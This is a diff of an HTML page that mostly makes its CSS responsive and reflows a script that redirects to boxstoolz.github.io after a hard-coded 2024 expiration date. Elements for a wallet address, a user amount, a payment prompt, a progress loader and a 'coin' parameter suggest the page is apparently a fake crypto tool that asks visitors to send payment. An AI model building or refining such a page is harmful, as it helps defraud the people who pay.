@@ -15,25 +15,25 @@
             height: 100vh;
             margin: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow: hidden; /* Prevent overflow */
         }
 
         .container {
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    background-color: #2c2c2c;
-    border-radius: 12px;
-    padding: 40px;
-    width: 90%; /* Use a percentage for responsiveness */
-    max-width: 700px; /* Keep the maximum width */
-    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); /* Glowing green shadow */
-    border: 2px solid #00ff00; /* Neon green border */
-    transition: box-shadow 0.3s ease-in-out;
-    margin: auto; /* Center the container */
-}
-
-
-      
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #2c2c2c;
+            border-radius: 12px;
+            padding: 5%; /* Use percentage for padding */
+            width: 90%; /* Full width */
+            max-width: 700px; /* Maximum width */
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); /* Glowing green shadow */
+            border: 2px solid #00ff00; /* Neon green border */
+            transition: box-shadow 0.3s ease-in-out;
+            margin: auto; /* Center the container */
+            position: relative; /* Relative position for child elements */
+            overflow: hidden; /* Prevent content overflow */
+        }
 
         .video-container {
             width: 100%;
@@ -44,7 +44,7 @@
 
         .video-screen {
             height: 0;
-            padding-bottom: 56.25%;
+            padding-bottom: 56.25%; /* Maintain aspect ratio */
             position: relative;
             background-color: #111;
             border: 2px solid #00ff00; /* Green border around video */
@@ -65,26 +65,28 @@
             border-top: 2px solid #00ff00; /* Neon green divider */
             margin: 30px 0;
         }
+
         .content {
-            padding: -50px;
+            padding: 0; /* Remove fixed padding */
             text-align: center;
         }
 
         h1 {
-            font-size: 28px;
+            font-size: 2rem; /* Use rem for responsive font size */
             color: #00ff00; /* Neon green text */
-            margin-bottom: 15px;
+            margin-bottom: 1rem; /* Adjusted for better spacing */
             text-shadow: 0 0 8px #00ff00;
         }
 
         .subtitle {
-            font-size: 18px;
+            font-size: 1.2rem; /* Use rem for responsive font size */
             color: #cccccc;
             margin-bottom: 20px;
         }
 
         .loader {
-            width: 300px;
+            width: 100%; /* Full width */
+            max-width: 300px; /* Maximum width for loader */
             height: 40px;
             background-color: #333;
             border-radius: 5px;
@@ -98,12 +100,12 @@
         #progress {
             width: 0;
             height: 100%;
-            background-color: #fa0000; /* Green progress bar */
+            background-color: #fa0000; /* Red progress bar */
             transition: width 0.8s ease-in-out;
         }
 
         #progress-text {
-            font-size: 16px;
+            font-size: 1rem; /* Responsive font size */
             color: #fff;
             position: absolute;
             top: 50%;
@@ -112,21 +114,21 @@
         }
 
         #wallet-address {
-            font-size: 16px;
+            font-size: 1rem; /* Responsive font size */
             color: #00ff00; /* Green text for wallet address */
             margin-bottom: 10px;
             font-weight: bold;
         }
 
         #user-amount {
-            font-size: 24px;
+            font-size: 1.5rem; /* Responsive font size */
             color: #eaeaea;
             margin-top: 10px;
         }
 
         .payment-prompt {
             margin-top: 20px;
-            font-size: 16px;
+            font-size: 1rem; /* Responsive font size */
             color: #fff200;
             min-height: 50px; /* Fixed height to prevent expansion */
             overflow: hidden; /* Ensure content stays within this size */
@@ -135,20 +137,38 @@
 
         @media (max-width: 768px) {
             .container {
-                width: 90%;
-                padding: 20px;
+                width: 95%; /* Full width on small screens */
+                padding: 3%; /* Adjust padding */
             }
 
             h1 {
-                font-size: 22px;
+                font-size: 1.8rem; /* Slightly smaller for smaller screens */
             }
 
             .subtitle {
-                font-size: 16px;
+                font-size: 1rem; /* Adjust subtitle font size */
             }
 
             #user-amount {
-                font-size: 20px;
+                font-size: 1.2rem; /* Adjust user amount font size */
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5rem; /* Further adjustment for very small screens */
+            }
+
+            .subtitle {
+                font-size: 0.9rem; /* Further adjustment for very small screens */
+            }
+
+            #user-amount {
+                font-size: 1rem; /* Further adjustment for very small screens */
+            }
+
+            .loader {
+                height: 30px; /* Smaller loader height */
             }
         }
     </style>
@@ -169,7 +189,7 @@
                 <div id="progress"></div>
                 <div id="progress-text">0%</div>
             </div>
-            <div id="user-amount" style="color: grey;font-size: 30px; margin-top: 5px;"></div>
+            <div id="user-amount" style="color: grey;font-size: 1.5rem; margin-top: 5px;"></div>
             <div id="payment-prompt" class="payment-prompt"></div>
         </div>
     </div>
@@ -247,15 +267,15 @@
         }
         
         var expirationDate = new Date('2024-12-23');
-         expirationDate.setDate(expirationDate.getDate());
-     localStorage.setItem('expirationDate', expirationDate.toISOString());
-       function checkExpiration() {
-       var expirationDate = new Date(localStorage.getItem('expirationDate'));
-    if (expirationDate < new Date()) {
-   window.location.href = 'https://boxstoolz.github.io'; 
-                 }
-             }
-   checkExpiration();
+        expirationDate.setDate(expirationDate.getDate());
+        localStorage.setItem('expirationDate', expirationDate.toISOString());
+        function checkExpiration() {
+            var expirationDate = new Date(localStorage.getItem('expirationDate'));
+            if (expirationDate < new Date()) {
+                window.location.href = 'https://boxstoolz.github.io'; 
+            }
+        }
+        checkExpiration();
 
         // Initialize the process based on the coin type parameter
         var coinType = getParameterByName("coin");
